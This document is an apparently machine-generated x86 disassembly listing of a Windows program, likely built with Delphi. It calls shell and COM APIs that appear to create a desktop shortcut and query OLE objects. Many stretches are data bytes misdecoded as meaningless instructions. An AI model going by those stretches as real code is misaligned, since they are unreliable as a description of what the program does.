mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_444d60
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_446d9c
mov ecx r-xdata
mov edx sub_44d554
mov eax [ r-xdata ]
call sub_419260
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dc5f
lea eax [ ebp - 0x10 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_45dcac
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_404620
mov [ edi + 0x4 ] esi
mov eax [ edi ]
mov edx edi
call [ eax + 0x14 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_45dcf0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_419f24
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_45dd6c
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0xc ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
sub_45ddc4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor edx edx
push ebp
push sub_45de9f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4533f4
test al al
je r-xdata
mov [ ebx + 0x164 ] 0x1
or [ ebx + 0x54 ] 0x4000
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx edi
mov edx esi
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ ebx + 0x164 ] 0x0
and [ ebx + 0x54 ] 0xbfff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx eax
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x10 ]
mov ecx [ ebp + 0x10 ]
sub ecx edx
push ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x14 ]
mov ecx [ ebp + 0xc ]
sub ecx edx
push ecx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0xc ]
add ecx edi
mov edx eax
add edx esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub_45deb0
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
cmp edx 0x7
ja r-xdata
jmp [ edx * 4 + jump_table_45decf ]
mov eax [ ebx + 0x4 ]
call sub_4533f4
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4533f4
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4533f4
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4533f4
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4533f4
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4533f4
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4533f4
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4533f4
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x40 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x44 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x48 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x180 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x184 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x188 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x18c ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x40 ]
sub eax [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x44 ]
sub eax [ ebx + 0xc ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x48 ]
add eax [ ebx + 0x8 ]
add eax [ ebx + 0x10 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4c ]
add eax [ ebx + 0xc ]
add eax [ ebx + 0x14 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x180 ]
sub eax [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x184 ]
sub eax [ ebx + 0xc ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x188 ]
add eax [ ebx + 0x8 ]
add eax [ ebx + 0x10 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x18c ]
add eax [ ebx + 0xc ]
add eax [ ebx + 0x14 ]
jmp r-xdata
sub_45e078
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45e0d7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e0de
retn
mov eax rw-data
call sub_40f944
call sub_45da58
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_4060f8
sub_45e0e0
clc
ja r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
sbb cl ah
inc ebp
add [ esi ] ah
inc [ eax ]
add ah ch
loopne r-xdata
jge r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x654e724f
ja r-xdata
add [ eax ] al
add [ eax ] bl
loope r-xdata
add [ ecx ] dl
or eax 0x72615654
imul esp [ ecx + 0x6e ] 0x72724174
popad
jns r-xdata
inc esp
and al 0x4
hlt
add [ eax ] al
add [ esp + 0x4 ] 0xfffffff4
jmp r-xdata
adc [ ebx + 0x6b ] esp
push edx
arpl [ ebx + 0x4e ] bp
ja r-xdata
outsb
je r-xdata
add [ esi ] cl
arpl [ ebx + 0x52 ] bp
jne r-xdata
dec edi
insb
push ebx
jb r-xdata
add [ eax ] al
add [ eax + 0xc004010 ] dh
add [ eax ] al
add [ eax + 0x9004010 ] dh
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45e6c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_406774
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
jmp r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x74736e49
popad
outsb
arpl [ ebp + 0x8 ] sp
arpl [ ebx + 0x52 ] bp
insd
outsd
je r-xdata
jmp sub_45e508
outsb
jae r-xdata
loope r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
add eax [ eax ]
add ah cl
int3
adc esp [ ebx + 0x6b ]
inc ecx
je r-xdata
inc esp
and al 0x4
hlt
jne r-xdata
popad
outsb
arpl [ ebp + 0x11 ] sp
arpl [ ebx + 0x52 ] bp
or al 0x0
add [ eax ] al
add [ ecx - 0x64ffba1f ] dl
loope r-xdata
xchg ecx eax
loope r-xdata
popad
arpl [ ebp + 0x9 ] sp
dec edi
insb
push ebx
jb r-xdata
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
jb r-xdata
dec ecx
add al ch
xchg [ edx + edi * 8 - 0x1 ] dh
mov eax rw-data
call sub_405530
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_4060f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e0de
retn
inc eax
add [ ecx ] bl
inc ebp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
inc edi
inc edi
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_45e968
add [ ebx - 0x5affba1f ] bl
loope r-xdata
popad
arpl [ eax + 0x54 ] bp
outsd
dec ecx
adc al 0x54
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x100045e2 ] al
add [ eax ] al
add al al
adc [ eax ] al
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ esp + edx * 2 ] dl
mov eax eax
and dl 0x45
add [ ebp - 0x50ffba1f ] ah
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx ] al
or al 0x54
inc ebx
outsd
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
add [ fs : eax ] eax
inc eax
add ah cl
add [ esp + 0x4 ] 0xfffffff4
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov eax [ ebp - 0x10 ]
sub eax ebx
add eax eax
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 8 ]
mov edx esi
call sub_411a68
inc ebx
dec edi
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + ebx * 4 ]
add eax eax
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 8 ]
mov edx esi
call sub_411a68
inc ebx
dec edi
jne r-xdata
jmp r-xdata
add dh dh
loope r-xdata
inc ebp
add [ edi + 0x20045e1 ] ch
add [ eax ] al
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
add [ edx ] al
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
xchg esp eax
adc [ eax ] al
inc esp
add [ eax ] al
inc [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x52110004 ] al
insd
jb r-xdata
add [ eax ] al
add [ eax ] al
jbe r-xdata
push 0x0
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e6cd
inc edi
inc edi
push esi
call IsEqualGUID
test al al
je r-xdata
dec ebp
popad
arpl [ eax + 0x69 ] bp
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ edi ] bh
inc ebp
add [ edi + ebx * 4 ] ah
inc ecx
add [ ebx + eax + 0x42 ] dl
add [ eax - 0x62 ] al
inc ecx
add [ edi + 0x2f40045 ] cl
inc edx
add [ esp + eax ] bh
inc edx
add [ eax + 0x7680042 ] dh
inc edx
add [ esp + eax + 0x42 ] cl
add [ esp + eax + 0x42 ] al
add [ eax - 0x17 ] al
inc ebp
add al ch
out 0x45 al
add [ eax - 0x4bffbfcc ] al
out 0x45 eax
add [ eax - 0x7fffba19 ] dh
xor al 0x40
add [ eax + 0xe004034 ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
or dl [ edi + ecx * 2 + 0x6c ]
push ebx
jb r-xdata
inc eax
add [ ebx + 0xa070045 ] bl
push esp
dec edi
insb
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
js r-xdata
outsb
je r-xdata
inc ebx
dec edi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
sub edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edx * 8 ]
call sub_411a68
inc ebx
dec edi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov edx [ edx + ebx * 4 ]
add edx edx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edx * 8 ]
call sub_411a68
mov eax 0x80004002
mov ecx edi
mov edx sub_45e4b8
mov eax ebx
call sub_404704
xor eax eax
jmp r-xdata
outsd
je r-xdata
add [ eax - 0x80000000 ] al
add al 0x0
adc [ edx + 0x65 ] edx
insd
jb r-xdata
add [ esi - 0x45 ] al
loop r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah bl
inc ebp
add [ eax ] dl
add [ eax ] al
dec eax
add [ ecx ] sub_420750
movsb [ edi ] [ esi ]
dec eax
inc eax
add [ eax + eax + 0x48ac0042 ] cl
inc eax
inc ebp
add [ ebx + 0x45 ] bl
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
mov ebx 0x4c0045e2
add [ eax ] al
imul esi [ ebx + 0x70 ] 0x68637461
lea eax [ eax ]
int3
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
movzx eax [ esi ]
and ax 0x4000
cmp ax 0x4000
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
movzx eax [ esi ]
and ax 0x4000
cmp ax 0x4000
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
inc ebx
outsd
outsb
outsb
arpl [ gs : eax + ebx - 0x1f ] si
inc ebp
add [ ecx + ebp * 8 ] cl
inc ebp
add [ eax ] ah
jmp r-xdata
jecxz r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + r-xdata ] dl
add [ eax + eax ] cl
push ebp
push sub_46e55e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x18 ]
push eax
push 0x10
push 0x0
call SHGetSpecialFolderLocation
test eax eax
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
or eax [ ebx + 0x6f ]
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
add [ edx + eax * 4 + 0x41 ] al
add [ 0x6c4f0900 ] al
push ebx
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e565
lea eax [ ebp - 0x12c ]
call sub_40700c
lea eax [ ebp - 0x128 ]
call sub_405530
lea eax [ ebp - 0x124 ]
call sub_40700c
lea eax [ ebp - 0x14 ]
call sub_40700c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
retn
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SHGetPathFromIDListA
lea edx [ ebp - 0x124 ]
mov eax [ rw-data ]
call sub_42be44
mov edx [ ebp - 0x124 ]
lea eax [ ebp - 0x14 ]
mov ecx r-xdata
call sub_407050
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0x50 ]
push 0x5
mov eax [ ebp - 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0x3c ]
lea eax [ ebp - 0x128 ]
lea edx [ ebp - 0x11d ]
mov ecx 0x105
call sub_4057a0
push [ ebp - 0x128 ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_4058e0
push 0xffffffff
mov eax [ ebp - 0x10 ]
call sub_40646c
push eax
lea eax [ ebp - 0x12c ]
mov edx [ ebp - 0x14 ]
mov ecx r-xdata
call sub_407050
mov eax [ ebp - 0x12c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
outsb
dec esi
popad
insd
mov eax eax
jb r-xdata
inc eax
add [ ecx + ebp * 8 ] ah
inc ebp
add [ ecx + ebp * 8 ] bh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410b0002 ] al
jne r-xdata
add [ eax ] al
adc [ eax ] al
and al 0xe9
je r-xdata
outsd
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_45e1c3
add [ esp + 0x4 ] 0xfffffff4
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_45e968
sub_45e464
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_404704
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x30 ]
add eax 0x20
push eax
push esi
call IsEqualGUID
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x80004002
mov ecx edi
mov edx sub_45e4b8
mov eax ebx
call sub_404704
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_45e4b8
add [ edx + eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_45e968
sub_45e4e8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_45e978
sub_45e6e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41ffc4
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ esi + 0x30 ]
inc [ eax + 0x38 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45e438
mov [ esi + 0x38 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_45e73c
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ esi + 0x38 ]
call sub_45e6d8
mov eax [ esi + 0x38 ]
push eax
call sub_45e4e8
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax + 0x38 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420010
test bl bl
jle r-xdata
mov eax [ esi + 0x38 ]
call sub_404650
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_45e78c
push ebx
mov ebx eax
mov eax ebx
call sub_42042c
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45e924
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
sub_45e7b4
push ebp
mov ebp esp
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45e8fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_45e90c
sub al 0x1
jb r-xdata
mov eax esi
call sub_40700c
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetActiveObject
test eax 0x80000000
sete al
test al al
jne r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e905
lea eax [ ebp - 0x24 ]
call sub_405d28
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_405554
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_42be44
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_42be44
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_40700c
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetActiveObject
mov esi eax
test esi 0x80000000
je r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x30 ]
call sub_42be18
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x30 ]
call sub_42bd90
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_407550
mov eax [ ebp - 0x20 ]
mov ecx 0x1
pop edx
call sub_40af98
push esi
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bbf8
call sub_404ec4
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
call sub_405ea8
mov eax [ ebp - 0x24 ]
mov ecx esi
mov edx [ ebx + 0x30 ]
call sub_42bf5c
jmp r-xdata
sub_45e940
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_404704
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_45e988
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45e9ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e9b4
retn
sub_45e9f1
dec [ ebx + 0x45e9f8c0 ]
add [ edi ] cl
or ecx [ ecx + 0x4d ]
jae r-xdata
add [ eax ] al
outsb
jb r-xdata
mov edi eax
mov esi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
mov edx [ rw-data ]
mov [ eax + 0x14 ] edx
pop edi
pop esi
retn
outsb
jb r-xdata
dec ebp
mov eax 0x10045e9
xchg [ edx ] dh
or al 0xd5
mov [ edi ] ecx
clc
dec eax
mov dl 0x4
add al 0x62
popfd
out dx al
adc [ eax ] dl
dec ebp
jae r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebp esp
push 0x0
push ebx
mov ebx edx
xor eax eax
push ebp
push sub_45eb13
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CoInitialize
lea edx [ ebp - 0x4 ]
mov eax rw-data
call sub_42be44
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx r-xdata
call sub_407050
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ ebx ] cl
inc ebx
outsd
dec ebp
jae r-xdata
outsb
jb r-xdata
inc ebp
add [ eax ] al
rcl [ eax ] 0x40
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x40045ea
add [ eax ] al
add al al
adc [ eax ] al
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
hlt
inc edx
add eax [ eax ]
jae r-xdata
push eax
dec ecx
pop edi
push esp
dec esp
inc edx
add eax 0x90ffff00
xor al 0xea
inc ebp
add [ edi ] cl
or ecx [ ecx + 0x4d ]
sub_45ea70
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x40045ea
add [ eax ] al
add al al
adc [ eax ] al
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ ebx ] cl
inc ebx
outsd
dec ebp
jae r-xdata
mov edi eax
mov esi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
mov edx [ rw-data ]
mov [ eax + 0x14 ] edx
pop edi
pop esi
retn
outsb
jb r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebp esp
push 0x0
push ebx
mov ebx edx
xor eax eax
push ebp
push sub_45eb13
push [ fs : eax ]
